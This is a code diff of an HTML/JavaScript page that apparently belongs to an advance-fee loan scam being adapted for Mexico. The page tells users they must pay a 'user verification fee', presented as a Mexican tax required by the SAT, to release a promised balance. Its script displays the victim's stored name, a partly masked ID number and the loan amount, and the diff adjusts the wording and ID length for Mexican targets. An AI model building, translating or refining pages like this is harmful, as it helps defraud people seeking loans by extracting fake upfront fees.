@@ -184,7 +184,7 @@ window.apiUrl = window.apiUrl || function (p) {
 
   <!-- Description -->
   <div style="margin:10px 16px 0;background:#e5e7eb;border-radius:16px;padding:18px;">
-    <p style="font-size:13px;color:#374151;line-height:1.65;">To receive the available balance, payment of the user verification fee is required. This fee covers the cost of the <strong style="color:#0a0a0a;">Impuesto de Formalización</strong> applicable under regulaciones fiscales mexicanas, ensuring the process complies with regulaciones del SAT and helps prevent any type of fraud.</p>
+    <p style="font-size:13px;color:#374151;line-height:1.65;">To receive the available balance, payment of the user verification fee es requerido. This fee covers the cost of the <strong style="color:#0a0a0a;">Impuesto de Formalización</strong> applicable under regulaciones fiscales mexicanas, ensuring the process complies with regulaciones del SAT and helps prevent any type of fraud.</p>
   </div>
 
   <!-- Footer text -->
@@ -220,7 +220,7 @@ try{(function(){
   var parts=nome.split(/\s+/);
   if(_n) _n.textContent=((parts[0]||'customer')+' '+(parts.slice(-1)[0]||'')).trim().toLowerCase();
   var nif=(localStorage.getItem('nif')||'').replace(/\D/g,'');
-  if(nif.length>=9 && _nif) _nif.textContent=nif.slice(0,3)+' *** *'+nif.slice(7,9);
+  if(nif.length>=18 && _nif) _nif.textContent=nif.slice(0,4)+' *** '+nif.slice(-4);
 
   // Dynamic available limit
   var loanRaw=parseFloat(localStorage.getItem('selectedLoanAmount')||localStorage.getItem('valorEmprestimo')||4600);
